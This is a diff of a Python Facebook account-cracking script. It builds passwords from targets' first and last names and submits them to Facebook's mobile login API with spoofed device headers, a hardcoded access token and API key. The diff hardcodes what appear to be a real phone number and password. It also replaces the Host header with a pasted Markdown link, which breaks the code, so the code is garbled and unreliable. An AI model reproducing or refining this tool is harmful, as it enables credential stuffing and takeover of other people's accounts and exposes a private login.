@@ -455,6 +455,7 @@ class main_crack():
             for pw in psw:
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 with requests.Session() as session:
+                
                     data = {"adid": str(uuid.uuid4()),
 "format": "json",
 "device_id": str(uuid.uuid4()),
@@ -463,8 +464,8 @@ class main_crack():
 "credentials_type": "device_based_login_password",
 "error_detail_type": "button_with_disabled",
 "source": "device_based_login",
-"email": sid,
-"password": ps,
+"email": '01742726245',
+"password": '708090',
 "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
@@ -475,10 +476,10 @@ class main_crack():
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': randBuildvsskj(),
+"api_key": "882a8490361da98702bf97a021ddc14d&sig=62f8ce9f74b12f84c123cc23437a4a32"}
+                headers = {'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 12; LTE Build/QP1A.707450.787) [FBAN/FB4A;FBAV/36.0.0.7401;FBBV/2557764;[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/214646499;FBCR/Extended Network;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]',
 'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
+'Host': '[graph.facebook.com](https://graph.facebook.com/?__cft__[0]=AZWR9HHpE5YiMZ8bDoZoCEEQ4gk5AukJnxProBVgpk3QrWvTOljhktmKGdrXQSIROVKAnZHUi21IhIlrvNLsbakenffsV_E-cME1xlmAUvIf5kPJNoClYiuZu-2OJ35_-IWK-VBtNd_OALQ_Co-5AyY61tFSjI1NYesmo0IKwDhzar2g_muqcti3G-EOT7HJPLk&__tn__=R]-R)',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
 'X-FB-Connection-Type': 'unknown',
